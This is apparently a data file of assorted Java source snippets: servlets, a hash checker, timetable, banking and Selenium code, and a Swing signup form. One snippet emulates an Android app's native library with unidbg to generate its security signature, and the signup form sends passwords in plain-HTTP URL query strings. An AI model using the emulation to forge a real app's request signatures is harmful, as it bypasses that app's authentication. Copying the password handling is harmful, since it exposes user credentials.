data=request.getParameter(\"t1\");\r\n\t\tif(data.length()!=0)\r\n\t\t{\r\n\t\t\tresponse.sendRedirect(\"https://www.google.com/search?q=\"+data);\r\n\t\t}\r\n\t}\r\n\r\n\t/**\r\n\t * @see HttpServlet#doPost(HttpServletRequest request, HttpServletResponse response)\r\n\t */\r\n\tprotected void doPost(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\r\n\t\t// TODO Auto-generated method stub\r\n\t\tdoGet(request, response);\r\n\t}\r\n\r\n}\r\n",
    "//Membres\u00eda Hash, 353195, Jos\u00e9 \u00c1ngel Ortiz Meraz, 14/11/23\nimport javax.swing.*;\nimport java.io.*;\n\npublic class HashFunction {\n    static File file = null;\n    static FileReader reader = null;\n    static BufferedReader buffer = null;\n\n    public static int hash(String word, int tableSize) {\n        int hash = 0;\n        for (char c : word.toCharArray()) {\n            hash += c;\n        }\n        return Math.abs(hash) % tableSize;\n    }\n\n    public static boolean membresia_diccionario(String word, int[] hashTable) {\n        int hashValue = hash(word, hashTable.length);\n        return hashTable[hashValue] == 1;\n    }\n\n    public static boolean membresia_email(String word) {\n        return word.matches(\"^[a-zA-Z0-9_+&*-]+(?:\\\\.[a-zA-Z0-9_+&*-]+)*@(?:[a-zA-Z0-9-]+\\\\.)+[a-zA-Z]{2,7}$\");\n    }\n\n    public static void main(String[] args) {\n        int tableSize = 81974;\n        int[] hashTable = new int[tableSize];\n        String[] dictionary;\n\n        try {\n            file = new File(\"diccionario.txt\");\n            reader = new FileReader(file);\n            buffer = new BufferedReader(reader);\n            String line;\n            int dictionarySize = 0;\n            while ((line = buffer.readLine()) != null) {\n                dictionarySize++;\n            }\n            // Inicializar el diccionario\n            dictionary = new String[dictionarySize];\n            reader = new FileReader(file);\n            buffer = new BufferedReader(reader);\n            int i = 0;\n            while ((line = buffer.readLine()) != null) {\n                dictionary[i] = line;\n                i++;\n            }\n        } catch (IOException e) {\n            JOptionPane.showMessageDialog(null, \"Error al leer el archivo: \" + e.getMessage());\n            return;\n        }\n\n        // Inicializar la tabla hash en ceros\n        for (int i = 0; i < tableSize; i++) {\n            hashTable[i] = 0;\n        }\n\n        // Realizar el hash de cada palabra y marcar la celda correspondiente en la tabla hash\n        for (String word : dictionary) {\n            int hashValue = hash(word, tableSize);\n            hashTable[hashValue] = 1;\n        }\n\n        String[] options = {\"Probar membres\u00eda en el diccionario\", \"Probar membres\u00eda como direcci\u00f3n de correo electr\u00f3nico\", \"Salir\"};\n\n        int choice;\n        do {\n            choice = JOptionPane.showOptionDialog(\n                    null,\n                    \"Seleccione una opci\u00f3n:\",\n                    \"Men\u00fa\",\n                    JOptionPane.DEFAULT_OPTION,\n                    JOptionPane.QUESTION_MESSAGE,\n                    null,\n                    options,\n                    options[0]\n            );\n\n            switch (choice) {\n                case 0:\n                    String wordDiccionario = JOptionPane.showInputDialog(\"Ingrese la palabra a verificar en el diccionario:\");\n                    if (membresia_diccionario(wordDiccionario, hashTable)) {\n                        JOptionPane.showMessageDialog(null, \"La palabra pertenece al diccionario.\");\n                    } else {\n                        JOptionPane.showMessageDialog(null, \"La palabra no pertenece al diccionario.\");\n                    }\n                    break;\n                case 1:\n                    String wordEmail = JOptionPane.showInputDialog(\"Ingrese la cadena a verificar como direcci\u00f3n de correo electr\u00f3nico:\");\n                    if (membresia_email(wordEmail)) {\n                        JOptionPane.showMessageDialog(null, \"La cadena es una direcci\u00f3n de correo electr\u00f3nico v\u00e1lida.\");\n                    } else {\n                        JOptionPane.showMessageDialog(null, \"La cadena no es una direcci\u00f3n de correo electr\u00f3nico v\u00e1lida.\");\n                    }\n                    break;\n                case 2:\n                    JOptionPane.showMessageDialog(null, \"Saliendo del programa.\");\n                    break;\n                default:\n                    JOptionPane.showMessageDialog(null, \"Opci\u00f3n no v\u00e1lida. Int\u00e9ntelo de nuevo.\");\n            }\n        } while (choice != 2);\n    }\n}\n",
    "package org.peyilo.sfsecurity;\n\nimport com.github.unidbg.AndroidEmulator;\nimport com.github.unidbg.Module;\nimport com.github.unidbg.arm.backend.Backend;\nimport com.github.unidbg.debugger.Debugger;\nimport com.github.unidbg.linux.android.AndroidEmulatorBuilder;\nimport com.github.unidbg.linux.android.AndroidResolver;\nimport com.github.unidbg.linux.android.dvm.*;\nimport com.github.unidbg.memory.Memory;\n\nimport java.io.File;\nimport java.io.FileNotFoundException;\nimport java.io.FileOutputStream;\nimport java.io.PrintStream;\nimport java.util.ArrayList;\nimport java.util.Arrays;\nimport java.util.List;\nimport java.util.UUID;\n\npublic class SfacgJni extends AbstractJni {\n\n    private final AndroidEmulator emulator;\n    private final VM vm;\n    private final Module module;\n    private final Debugger debugger;\n    private final Backend backend;\n\n    public SfacgJni() {\n        emulator = AndroidEmulatorBuilder.for32Bit()\n                .setProcessName(\"org.peyilo.sfsecurity\")\n                .build();\n        final Memory memory = emulator.getMemory();\n        final String dir = \"src/main/resources/\" + \"version3\" + \"/\";\n        memory.setLibraryResolver(new AndroidResolver(23));\n        vm = emulator.createDalvikVM(new File(dir + \"boluobao.apk\"));\n        DalvikModule dalvikModule = vm.loadLibrary(new File(dir + \"libsfdata.so\"), false);\n        module = dalvikModule.getModule();  // \u83b7\u5f97so\u64cd\u4f5c\u53e5\u67c4\n        saveTraceCode(dir + \"log.txt\");                 // \u4fdd\u5b58\u6c47\u7f16\u4ee3\u7801\u6267\u884c\u8fc7\u7a0b\u5230txt\u6587\u4ef6\u4e2d\n        vm.setJni(this);\n        // vm.setVerbose(true);             // \u6253\u5370\u4fe1\u606f\u662f\u5426\u8be6\u7ec6\n        dalvikModule.callJNI_OnLoad(emulator);\n        debugger = emulator.attach();\n        backend = emulator.getBackend();\n    }\n\n    private void saveTraceCode(String path) {\n        try {\n            PrintStream traceStream = new PrintStream(new FileOutputStream(path), true);\n            emulator.traceCode(module.base, module.base + module.size).setRedirect(traceStream);\n        } catch (FileNotFoundException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public String getSFSecurity(String deviceToken) {\n        System.out.println(\"\\ngetSFSecurity:\");\n\n        // JNI\u7b7e\u540d\u7ea6\u5b9a\uff1aJava_com_sf_security_AuthConfig_getSFSecurity\u5bf9\u5e94\u7684\u51fd\u6570\u7b7e\u540d\u4e3a\n        // Java_com_sf_security_AuthConfig_getSFSecurity(JNIEnv *env, jobject obj, ...)\n        // \u5728java\u4e2d\u7684\u51fd\u6570\u7b7e\u540d\u5982\u4e0b\n        // private native String getSFSecurity(Context context, String str);\n        List<Object> list = new ArrayList<>(10);\n        list.add(vm.getJNIEnv());       // \u7b2c\u4e00\u4e2a\u53c2\u6570\u4e3aJNIEnv\u6307\u9488\n        // \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u5b9e\u4f8b\u65b9\u6cd5\u662fjobject\uff0c\u9759\u6001\u65b9\u6cd5\u662fjclazz\uff0c\u76f4\u63a5\u586b0\uff0c\u4e00\u822c\u7528\u4e0d\u5230\u3002\n        list.add(0);\n        // getSFSecurity(Context context, String str)\u5bf9\u5e94\u7684\u4e24\u4e2a\u53c2\u6570\n        DvmObject<?> dvmObject = vm.resolveClass(\"android/content/Context\").newObject(null);\n        list.add(vm.addLocalObject(dvmObject));\n        list.add(vm.addLocalObject(new StringObject(vm, deviceToken)));\n        debug();\n\n        // +1 thumb\u6a21\u5f0f arm\u4e0d\u7528\u52a0\n        Number number = module.callFunction(emulator, 0xAB3C + 1, list.toArray());\n        return vm.getObject(number.intValue()).getValue().toString();\n    }\n\n    // \u6dfb\u52a0\u65ad\u70b9\u8fdb\u884c\u8c03\u8bd5\n    private void debug() {\n        try {\n            debugger.addBreakPoint(module, 0xb4b4 + 1, (emulator1, address) -> {\n                System.out.println(\"Debugger:\");\n                byte[] bytes = backend.mem_read(0xbffff3b9L, 64);\n                String s = new String(bytes);\n                System.out.println(s);\n                System.out.println(Arrays.toString(bytes));\n                return true;\n            });\n        }catch (Exception e) {\n            e.printStackTrace();\n        }\n    }\n\n    @Override\n    public DvmObject<?> callStaticObjectMethodV(BaseVM vm, DvmClass dvmClass, String signature, VaList vaList) {\n        // System.out.println(signature);\n        if (signature.equals(\"java/util/UUID->randomUUID()Ljava/util/UUID;\")) {\n            UUID uuid = UUID.randomUUID();\n            System.out.println(\"randomUUID: \" + uuid);\n            return dvmClass.newObject(uuid);\n        }\n        return super.callStaticObjectMethodV(vm, dvmClass, signature, vaList);\n    }\n\n    @Override\n    public DvmObject<?> callObjectMethodV(BaseVM vm, DvmObject<?> dvmObject, String signature, VaList vaList) {\n        //System.out.println(signature);\n        if (signature.equals(\"java/util/UUID->toString()Ljava/lang/String;\")) {\n            String uuid = dvmObject.getValue().toString();\n            System.out.println(\"toString: \" + uuid);\n            return new StringObject(vm, uuid);\n        }\n        return super.callObjectMethodV(vm, dvmObject, signature, vaList);\n    }\n\n}\n",
    "package de.stsFanGruppe.templatebuilder.zug;\r\n\r\nimport java.util.*;\r\nimport de.stsFanGruppe.templatebuilder.strecken.Betriebsstelle;\r\nimport de.stsFanGruppe.templatebuilder.strecken.Gleisabschnitt;\r\nimport de.stsFanGruppe.tools.NullTester;\r\n\r\n/**\r\n * Ein Fahrplanhalt ist ein Eintrag in einem Fahrplan eines Zuges, der einem Gleisabschnitt\r\n * eine Ankunft und eine Abfahrt zuweist.\r\n * Fahrplanhalte sind zeitlich geordnet, zuerst nach Ankunft, dann nach Abfahrt.\r\n * \r\n * @author DevonFrosch\r\n */\r\npublic class Fahrplanhalt implements Comparable<Fahrplanhalt>\r\n{\r\n\tprotected Gleisabschnitt gleisabschnitt;\r\n\tprotected OptionalDouble ankunft;\r\n\tprotected OptionalDouble abfahrt;\r\n\tprotected FahrplanhaltEigenschaften eigenschaften;\r\n\tprotected Fahrt parent = null;\r\n\t\r\n\tpublic Fahrplanhalt(Gleisabschnitt gleisabschnitt, OptionalDouble ankunft, OptionalDouble abfahrt, FahrplanhaltEigenschaften eigenschaften)\r\n\t{\r\n\t\tthis.setGleisabschnitt(gleisabschnitt);\r\n\t\tthis.setZeiten(ankunft, abfahrt);\r\n\t\tthis.setEigenschaften(eigenschaften);\r\n\t}\r\n\t\r\n\tprotected Fahrplanhalt(Fahrt parent, Gleisabschnitt gleisabschnitt, OptionalDouble ankunft, OptionalDouble abfahrt, FahrplanhaltEigenschaften eigenschaften)\r\n\t{\r\n\t\tthis(gleisabschnitt, ankunft, abfahrt, eigenschaften);\r\n\t\tthis.setParent(parent);\r\n\t}\r\n\t\r\n\tpublic Gleisabschnitt getGleisabschnitt()\r\n\t{\r\n\t\treturn gleisabschnitt;\r\n\t}\r\n\t\r\n\tpublic void setGleisabschnitt(Gleisabschnitt gleisabschnitt)\r\n\t{\r\n\t\tNullTester.test(gleisabschnitt);\r\n\t\tthis.gleisabschnitt = gleisabschnitt;\r\n\t}\r\n\t\r\n\tpublic Betriebsstelle getBetriebsstelle()\r\n\t{\r\n\t\treturn gleisabschnitt.getParent().getParent();\r\n\t}\r\n\t\r\n\tpublic OptionalDouble getAnkunft()\r\n\t{\r\n\t\treturn ankunft;\r\n\t}\r\n\t\r\n\t/**\r\n\t * Setzt Ankunft und Abfahrt zeitgleich.\r\n\t * \r\n\t * @param ankunft Die Ankunft am Gleisabschnitt.\r\n\t * @throws IllegalArgumentException Falls eine Zeit kleiner 0 oder die Abfahrt kleiner als (vor der) Ankunft ist.\r\n\t */\r\n\tpublic void setAnkunft(OptionalDouble ankunft)\r\n\t{\r\n\t\tif(ankunft.isPresent())\r\n\t\t{\r\n\t\t\tif(ankunft.getAsDouble() < 0)\r\n\t\t\t{\r\n\t\t\t\tthrow new IllegalArgumentException(\"Zeit muss gr\u00f6\u00dfer gleich 0 sein\");\r\n\t\t\t}\r\n\t\t\tif(abfahrt.isPresent() && ankunft.getAsDouble() > abfahrt.getAsDouble())\r\n\t\t\t{\r\n\t\t\t\tthrow new IllegalArgumentException(\"Abfahrt vor Ankunft\");\r\n\t\t\t}\r\n\t\t}\r\n\t\tthis.ankunft = ankunft;\r\n\t}\r\n\t\r\n\tpublic OptionalDouble getAbfahrt()\r\n\t{\r\n\t\treturn abfahrt;\r\n\t}\r\n\t\r\n\t/**\r\n\t * Setzt Ankunft und Abfahrt zeitgleich.\r\n\t * \r\n\t * @param abfahrt Die Abfahrt am Gleisabschnitt.\r\n\t * @throws IllegalArgumentException Falls eine Zeit kleiner 0 oder die Abfahrt kleiner als (vor der) Ankunft ist.\r\n\t */\r\n\tpublic void setAbfahrt(OptionalDouble abfahrt)\r\n\t{\r\n\t\tif(abfahrt.isPresent())\r\n\t\t{\r\n\t\t\tif(abfahrt.getAsDouble() < 0)\r\n\t\t\t{\r\n\t\t\t\tthrow new IllegalArgumentException(\"Zeit muss gr\u00f6\u00dfer gleich 0 sein\");\r\n\t\t\t}\r\n\t\t\tif(ankunft.isPresent() && ankunft.getAsDouble() > abfahrt.getAsDouble())\r\n\t\t\t{\r\n\t\t\t\tthrow new IllegalArgumentException(\"Abfahrt vor Ankunft\");\r\n\t\t\t}\r\n\t\t}\r\n\t\tthis.abfahrt = abfahrt;\r\n\t}\r\n\t\r\n\t/**\r\n\t * Setzt Ankunft und Abfahrt zeitgleich.\r\n\t * \r\n\t * @param ankunft Die Ankunft am Gleisabschnitt.\r\n\t * @param abfahrt Die Abfahrt am Gleisabschnitt.\r\n\t * @throws IllegalArgumentException Falls eine Zeit kleiner 0 oder die Abfahrt kleiner als (vor der) Ankunft ist.\r\n\t */\r\n\tpublic void setZeiten(OptionalDouble ankunft, OptionalDouble abfahrt)\r\n\t{\r\n\t\tif(!ankunft.isPresent() && !abfahrt.isPresent())\r\n\t\t{\r\n\t\t\tthrow new IllegalArgumentException(\"Keine Ankunft und keine Abfahrt\");\r\n\t\t}\r\n\t\tif((abfahrt.isPresent() && abfahrt.getAsDouble() < 0) || (ankunft.isPresent() && ankunft.getAsDouble() < 0))\r\n\t\t{\r\n\t\t\tthrow new IllegalArgumentException(\"Zeit muss gr\u00f6\u00dfer gleich 0 sein\");\r\n\t\t}\r\n\t\tif(ankunft.isPresent() && abfahrt.isPresent() && ankunft.getAsDouble() > abfahrt.getAsDouble())\r\n\t\t{\r\n\t\t\tthrow new IllegalArgumentException(\"Abfahrt vor Ankunft\");\r\n\t\t}\r\n\t\tthis.ankunft = ankunft;\r\n\t\tthis.abfahrt = abfahrt;\r\n\t}\r\n\t\r\n\tpublic double getMinZeit()\r\n\t{\r\n\t\tif(ankunft.isPresent())\r\n\t\t{\r\n\t\t\treturn ankunft.getAsDouble();\r\n\t\t}\r\n\t\treturn abfahrt.getAsDouble();\r\n\t}\r\n\t\r\n\tpublic double getMaxZeit()\r\n\t{\r\n\t\tif(abfahrt.isPresent())\r\n\t\t{\r\n\t\t\treturn abfahrt.getAsDouble();\r\n\t\t}\r\n\t\treturn ankunft.getAsDouble();\r\n\t}\r\n\t\r\n\tpublic FahrplanhaltEigenschaften getEigenschaften()\r\n\t{\r\n\t\treturn eigenschaften;\r\n\t}\r\n\t\r\n\tpublic void setEigenschaften(FahrplanhaltEigenschaften eigenschaften)\r\n\t{\r\n\t\tNullTester.test(eigenschaften);\r\n\t\tthis.eigenschaften = eigenschaften;\r\n\t}\r\n\t\r\n\tpublic Fahrt getParent()\r\n\t{\r\n\t\treturn parent;\r\n\t}\r\n\t\r\n\tprotected void setParent(Fahrt parent)\r\n\t{\r\n\t\tthis.parent = parent;\r\n\t}\r\n\t\r\n\tpublic String toString()\r\n\t{\r\n\t\treturn \"Fahrplanhalt { gleisabschnitt: \" + gleisabschnitt.getName() + ((ankunft.isPresent()) ? \", ankunft: \" + ankunft.getAsDouble() : \"\")\r\n\t\t\t\t+ ((abfahrt.isPresent()) ? \", abfahrt: \" + abfahrt.getAsDouble() : \"\") + \", \" + eigenschaften.toString() + \" }\";\r\n\t}\r\n\t\r\n\tpublic String toXML()\r\n\t{\r\n\t\treturn toXML(\"\");\r\n\t}\r\n\t\r\n\tpublic String toXML(String indent)",
    "package utilities;\n\nimport org.apache.commons.io.FileUtils;\nimport org.openqa.selenium.*;\nimport org.openqa.selenium.interactions.Actions;\nimport org.openqa.selenium.support.ui.*;\n\nimport java.io.File;\nimport java.io.IOException;\nimport java.text.SimpleDateFormat;\nimport java.time.Duration;\nimport java.util.ArrayList;\nimport java.util.Date;\nimport java.util.List;\nimport java.util.Random;\nimport java.util.function.Function;\n\npublic class ReusableMethods {\n    private static int timeout = 5;\n\n    public static String getScreenshot(String name) throws IOException {\n        // naming the screenshot with the current date to avoid duplication\n        String date = new SimpleDateFormat(\"yyyyMMddhhmmss\").format(new Date());\n\n        // TakesScreenshot is an interface of selenium that takes the screenshot\n        TakesScreenshot ts = (TakesScreenshot) Driver.getDriver();\n        File source = ts.getScreenshotAs(OutputType.FILE);\n        // full path to the screenshot location\n        String target = \"target/Screenshots/\" + name + date + \".png\";\n\n        File finalDestination = new File(target);\n        // save the screenshot to the path given\n        FileUtils.copyFile(source, finalDestination);\n\n        return target;\n    }\n    //========ScreenShot Web Element(Bir webelementin resmini alma)=====//\n    public static String getScreenshotWebElement(String name,WebElement element) throws IOException {\n        String date = new SimpleDateFormat(\"yyyyMMddhhmmss\").format(new Date());\n        // TakesScreenshot is an interface of selenium that takes the screenshot\n        File source = element.getScreenshotAs(OutputType.FILE);\n        // full path to the screenshot location\n        String wElementSS = System.getProperty(\"user.dir\") + \"/target/WElementScreenshots/\" + name + date + \".png\";\n        File finalDestination = new File(wElementSS);\n        // save the screenshot to the path given\n        FileUtils.copyFile(source, finalDestination);\n        return  wElementSS;\n    }\n    //========Switching Window=====//\n    public static void switchToWindow(String targetTitle) {\n        String origin = Driver.getDriver().getWindowHandle();\n        for (String handle : Driver.getDriver().getWindowHandles()) {\n            Driver.getDriver().switchTo().window(handle);\n            if (Driver.getDriver().getTitle().equals(targetTitle)) {\n                return;\n            }\n        }\n        Driver.getDriver().switchTo().window(origin);\n    }\n\n    //========Hover Over=====//\n    public static void hover(WebElement element) {\n        Actions actions = new Actions(Driver.getDriver());\n        actions.moveToElement(element).perform();\n    }\n\n    //==========Return a list of string given a list of Web Element====////\n    public static List<String> getElementsText(List<WebElement> list) {\n        List<String> elemTexts = new ArrayList<>();\n        for (WebElement el : list) {\n            if (!el.getText().isEmpty()) {\n                elemTexts.add(el.getText());\n            }\n        }\n        return elemTexts;\n    }\n\n    //========Returns the Text of the element given an element locator==//\n    public static List<String> getElementsText(By locator) {\n        List<WebElement> elems = Driver.getDriver().findElements(locator);\n        List<String> elemTexts = new ArrayList<>();\n        for (WebElement el : elems) {\n            if (!el.getText().isEmpty()) {\n                elemTexts.add(el.getText());\n            }\n        }\n        return elemTexts;\n    }\n\n    //===============Thread.sleep Wait==============//\n    public static void waitFor(int sec) {\n        try {\n            Thread.sleep(sec * 1000);\n        } catch (InterruptedException e) {\n            e.printStackTrace();\n        }\n    }\n\n    //===============Explicit Wait==============//\n    public static WebElement waitForVisibility(WebElement element, int timeToWaitInSec) {\n        WebDriverWait wait = new WebDriverWait(Driver.getDriver(), Duration.ofSeconds(10));\n        return wait.until(ExpectedConditions.visibilityOf(element));\n    }\n\n    public static void waitForPageToLoad(long timeOutInSeconds) {\n        ExpectedCondition<Boolean> expectation = new ExpectedCondition<Boolean>() {\n            public Boolean apply(WebDriver driver) {\n                return ((JavascriptExecutor) driver).executeScript(\"return document.readyState\").equals(\"complete\");\n            }\n        };\n        try {\n            System.out.println(\"Waiting for page to load...\");\n            WebDriverWait wait = new WebDriverWait(Driver.getDriver(), Duration.ofSeconds(10));\n            wait.until(expectation);\n        } catch (Throwable error) {\n            System.out.println(\n                    \"Timeout waiting for Page Load Request to complete after \" + timeOutInSeconds + \" seconds\");\n        }\n    }\n\n    //======Fluent Wait====//\n    public static WebElement fluentWait(final WebElement webElement, int timeinsec) {\n        FluentWait<WebDriver> wait = new FluentWait<WebDriver>(Driver.getDriver())\n          ",
    "import java.util.Scanner;\n\n\npublic class Main {\n\n  public static void main(String[] args) {      \n\n    menu();\n  }\n\n\n  public static void menu(){    \n    Banco bank = new Banco();\n    Scanner ler = new Scanner(System.in);\n    // cadastro\n    System.out.println(\"Ol\u00e1 bem vindo ao  MarxBank\\n\\n\");\n    System.out.println(\"Insira seu nome: \");\n    bank.setNome(ler.nextLine());\n    System.out.println(\"Insira o sombrenome: \");\n    bank.setSobrenome(ler.nextLine());\n    System.out.println(\"Insira o CPF: \");\n    bank.setCpf(ler.nextLine());\n    System.out.println(\"Obrigado pelo cadastro \"+ bank.getNome());\n\n\n    //cadastro fim\n\n\n\n\n    int indicador;\n    indicador = 0;  \n\n    System.out.println(\"Ola \"+ bank.getNome());\n    System.out.println(\"Escolha uma das op\u00e7\u00f5es:\\n1 - Saldo\\n2 - Deposito\\n3 - Saque\\n4 - Sair\");\n    while (indicador != 4){\n    indicador = ler.nextInt();\n\n    switch (indicador){\n      case 1:\n        System.out.println(\"Seu saldo \u00e9 de R$ \"+ bank.getSaldo());\n        break;\n      case 2:\n        System.out.println(\"Insira um valor de dep\u00f3sito: R$ \");\n        bank.setSaldo(ler.nextFloat() + bank.getSaldo());\n        System.out.println(\"Seu saldo agora \u00e9 R$ \"+ bank.getSaldo());\n        break;\n      case 3:\n        float saque;\n        System.out.println(\"Insira o valor do Saque: \");\n        saque = ler.nextFloat();\n        if (bank.getSaldo() >= saque){\n          bank.setSaldo(bank.getSaldo() - saque);\n          System.out.println(\"Seu saldo atual \u00e9 R$ \"+ bank.getSaldo());\n        }else{\n          System.out.println(\"Saldo Insuficiente\");\n\n        }\n          break;\n       case 4:\n        break;\n\n    }\n      }\n  }\n\n  // @Test\n  // void addition() {\n  //     assertEquals(2, 1 + 1);\n  // }\n}",
    "package springboot.project.test;\n\nimport jakarta.persistence.EntityManager;\nimport jakarta.persistence.PersistenceContext;\nimport org.junit.jupiter.api.Test;\nimport org.springframework.boot.test.context.SpringBootTest;\nimport org.springframework.test.annotation.Rollback;\nimport org.springframework.transaction.annotation.Transactional;\n\n@SpringBootTest\n@Transactional\nclass FoodTest {\n\n    @PersistenceContext\n    private EntityManager entityManager;\n\n    @Test\n    @Rollback(false)\n    void foodTest() {\n\n        Food food1 = new Food(\"apple\", 2000, 10);\n        Food food2 = new Food(\"banana\", 1000, 3);\n        Food food3 = new Food(\"candy\", 300, 1);\n\n        entityManager.persist(food1);\n        entityManager.persist(food2);\n        entityManager.persist(food3);\n\n        FoodSequence foodSequence1 = new FoodSequence(\"apple\", 2000, 10);\n        FoodSequence foodSequence2 = new FoodSequence(\"banana\", 1000, 3);\n        FoodSequence foodSequence3 = new FoodSequence(\"candy\", 300, 1);\n\n        entityManager.persist(foodSequence1);\n        entityManager.persist(foodSequence2);\n        entityManager.persist(foodSequence3);\n\n    }\n}",
    "package vetor;\n\npublic class vet {\n    private String nome;\n    private int pre\u00e7o;\n    public vet(String nome,int pre\u00e7o){\n        this.nome=nome;\n        this.pre\u00e7o=pre\u00e7o;\n    }\n    public void setNome(String nome){\n        this.nome=nome;\n    }\n    public void setPre\u00e7o(int pre\u00e7o){\n        this.pre\u00e7o=pre\u00e7o;\n    }\n    public String getNome() {\n        return nome;\n    }\n    public int getPre\u00e7o() {\n        return pre\u00e7o;\n    }\n}\npackage vetor2;\n\nimport vetor.vet;\n\nimport java.util.Scanner;\n\npublic class vet2 {\n    public static void main(String[] args) {\n        Scanner ler = new Scanner(System.in);\n        int n;\n        System.out.println(\"Digite o valor de N:\");\n        n = ler.nextInt();\n        ler.nextLine();\n        vet[] veti = new vet[n];\n        for (int i = 0; i < veti.length; i++) {\n            System.out.println(\"Produtos\" + (i + 1) + \":\");\n            System.out.println(\"Digite o nome do produto:\");\n            String nome = ler.nextLine();\n            System.out.println(\"Digite o pre\u00e7o do produto:\");\n            int pre\u00e7o = ler.nextInt();\n            ler.nextLine();\n            veti[i] = new vet(nome, pre\u00e7o);\n        }\n        double soma=0;\n        for (int i = 0; i < n; i++) {\n            soma+=veti[i].getPre\u00e7o();\n        }\n         double media=soma/n;\n        System.out.println(\"A media de pre\u00e7o dos produtos s\u00e3o:\" +media);\n    }\n}\n",
    "public class Hosteller extends Student {\r\n    private int roomNumber;\r\n    private char blockName;\r\n    private String roomType;\r\n\r\n    // Constructor\r\n    public Hosteller(int studentId, String studentName, String department, String gender, String category, double collegeFee,\r\n                     int roomNumber, char blockName, String roomType) {\r\n        super(studentId, studentName, department, gender, category, collegeFee);\r\n        this.roomNumber = roomNumber;\r\n        this.blockName = blockName;\r\n        this.roomType = roomType;\r\n    }\r\n\r\n    // Getters and Setters\r\n    public int getRoomNumber() {\r\n        return roomNumber;\r\n    }\r\n\r\n    public void setRoomNumber(int roomNumber) {\r\n        this.roomNumber = roomNumber;\r\n    }\r\n\r\n    public char getBlockName() {\r\n        return blockName;\r\n    }\r\n\r\n    public void setBlockName(char blockName) {\r\n        this.blockName = blockName;\r\n    }\r\n\r\n    public String getRoomType() {\r\n        return roomType;\r\n    }\r\n\r\n    public void setRoomType(String roomType) {\r\n        this.roomType = roomType;\r\n    }\r\n\r\n    // Calculate total fee method\r\n    public double calculateTotalFee() {\r\n        double hostelFee = 0;\r\n        \r\n        // Calculate hostel fee based on blockName and roomType\r\n        switch (blockName) {\r\n            case 'A':\r\n                hostelFee = roomType.equals(\"AC\") ? 8000 : 60000;\r\n                break;\r\n            case 'B':\r\n                hostelFee = roomType.equals(\"AC\") ? 5000 : 50000;\r\n                break;\r\n            case 'C':\r\n                hostelFee = roomType.equals(\"AC\") ? 2500 : 40000;\r\n                break;\r\n            default:\r\n                System.out.println(\"Invalid blockName\");\r\n                break;\r\n        }\r\n\r\n        // Calculate total amount\r\n        if (roomType.equals(\"AC\")) {\r\n            return collegeFee + hostelFee + 2500; // AC roomType has additional 2500\r\n        } else {\r\n            return collegeFee + hostelFee;\r\n        }\r\n    }\r\n}\r\n",
    "package com.example.gourmetcompass.ui.dashboard;\n\nimport android.os.Bundle;\nimport android.view.LayoutInflater;\nimport android.view.View;\nimport android.view.ViewGroup;\nimport android.widget.TextView;\n\nimport androidx.annotation.NonNull;\nimport androidx.fragment.app.Fragment;\nimport androidx.lifecycle.ViewModelProvider;\n\nimport com.example.gourmetcompass.databinding.FragmentDashboardBinding;\n\npublic class DashboardFragment extends Fragment {\n\n    private FragmentDashboardBinding binding;\n\n    public View onCreateView(@NonNull LayoutInflater inflater,\n                             ViewGroup container, Bundle savedInstanceState) {\n        DashboardViewModel dashboardViewModel =\n                new ViewModelProvider(this).get(DashboardViewModel.class);\n\n        binding = FragmentDashboardBinding.inflate(inflater, container, false);\n        View root = binding.getRoot();\n\n        final TextView textView = binding.textDashboard;\n        dashboardViewModel.getText().observe(getViewLifecycleOwner(), textView::setText);\n        return root;\n    }\n\n    @Override\n    public void onDestroyView() {\n        super.onDestroyView();\n        binding = null;\n    }\n}",
    "package com.talent_insider.frontend;\n\nimport java.awt.BorderLayout;\nimport java.awt.GridLayout;\nimport java.awt.Window;\nimport java.awt.event.ActionEvent;\nimport java.awt.event.ActionListener;\nimport java.io.OutputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nimport javax.swing.JButton;\nimport javax.swing.JFrame;\nimport javax.swing.JLabel;\nimport javax.swing.JPanel;\nimport javax.swing.JTextField;\nimport javax.swing.SwingUtilities;\n\npublic class SignupClient extends JFrame{\n    SignupClient(){\n        setTitle(\"Signup as a Client\");\n        setSize(800, 800);\n        setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);\n        setVisible(true);\n\n        // Name\n        JPanel namePanel = new JPanel();\n        JLabel nameLabel = new JLabel(\"Name: \");\n        JTextField nameField = new JTextField();\n        nameField.setColumns(20);\n        namePanel.add(nameLabel);\n        namePanel.add(nameField);\n        // User Name\n        JPanel userNamePanel = new JPanel();\n        JLabel userNameLabel = new JLabel(\"User Name: \");\n        JTextField userNameField = new JTextField();\n        userNameField.setColumns(20);\n        userNamePanel.add(userNameLabel);\n        userNamePanel.add(userNameField);\n        // Password\n        JPanel passwordPanel = new JPanel();\n        JLabel passwordLabel = new JLabel(\"Password: \");\n        JTextField passwordField = new JTextField();\n        passwordField.setColumns(20);\n        passwordPanel.add(passwordLabel);\n        passwordPanel.add(passwordField);\n        // Email\n        JPanel emailPanel = new JPanel();\n        JLabel emailLabel = new JLabel(\"Email: \");\n        JTextField emailField = new JTextField();\n        emailField.setColumns(20);\n        emailPanel.add(emailLabel);\n        emailPanel.add(emailField);\n        // Description\n        JPanel descriptionPanel = new JPanel();\n        JLabel descriptionLabel = new JLabel(\"Description: \");\n        JTextField descriptionField = new JTextField();\n        descriptionField.setColumns(20);\n        descriptionPanel.add(descriptionLabel);\n        descriptionPanel.add(descriptionField);\n        // Website\n        JPanel websitePanel = new JPanel();\n        JLabel websiteLabel = new JLabel(\"Website: \");\n        JTextField websiteField = new JTextField();\n        websiteField.setColumns(20);\n        websitePanel.add(websiteLabel);\n        websitePanel.add(websiteField);\n        // Login Button\n        JPanel loginButtonPanel = new JPanel();\n        final JButton loginButton = new JButton(\"Signup\");\n        loginButtonPanel.add(loginButton);\n\n        loginButton.addActionListener(new ActionListener() {\n            @Override\n            public void actionPerformed(ActionEvent e) {\n\n                try {\n                    // 1. Prepare the URL\n                    String endpoint = \"http://localhost:8080/ansh_singhal/companySignup?username=\"+ userNameField.getText() +\"&password=\"+ passwordField.getText() +\"&email=\"+ emailField.getText() +\"&name=\"+ nameField.getText() +\"&description=\"+ descriptionField.getText() +\"&website=\" + websiteField.getText();\n                    URL url = new URL(endpoint);\n\n                    // 2. Open the connection\n                    HttpURLConnection connection = (HttpURLConnection) url.openConnection();\n                    connection.setRequestMethod(\"POST\");\n                    connection.setDoOutput(true); // Enable sending a request body\n\n                    // 3. Set headers (if needed)\n                    